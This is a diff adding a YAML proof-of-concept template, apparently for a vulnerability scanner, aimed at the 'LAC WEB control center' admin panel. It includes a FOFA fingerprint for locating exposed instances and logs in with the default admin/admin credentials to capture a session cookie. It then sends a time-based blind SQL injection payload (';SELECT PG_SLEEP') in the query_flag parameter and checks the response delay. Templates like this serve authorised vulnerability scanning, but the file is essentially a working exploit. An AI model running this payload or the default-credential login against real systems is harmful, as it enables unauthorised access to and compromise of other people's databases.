@@ -1,0 +1,27 @@
+id: poc-yaml-lac-web-control-center-background-sqli
+info:
+  name: LAC WEB控制中心 后台SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: LAC WEB控制中心
+  fofa: body="欢迎进入LAC WEB控制中心"
+variables:
+  t1: random_int(1,5)
+  t2: t1 * 2 + 1
+requests:
+- method: POST
+  path: /index.php?a=checklogin&m=public
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: account=admin&password=admin
+  expression: status_code == 200 && contains(body,"登录成功")
+  output:
+  - regex_match(headers,"PHPSESSID=(?P<cookie>.*);")
+- method: GET
+  path: /index.php/apbasic/index?tag=13&query_id=id&query_flag=123;SELECT+PG_SLEEP({{.t1}})--&query_style=input&query_require=%3D&query_field_id=&query_field_sort=&query_submit=%E6%9F%A5%E8%AF%A2
+  headers:
+    Cookie: PHPSESSID={{.cookie}}
+  expression: status_code == 200 && contains(body,"apid") && duration >= t1 * 2 &&
+    duration <= t2
+transport: http
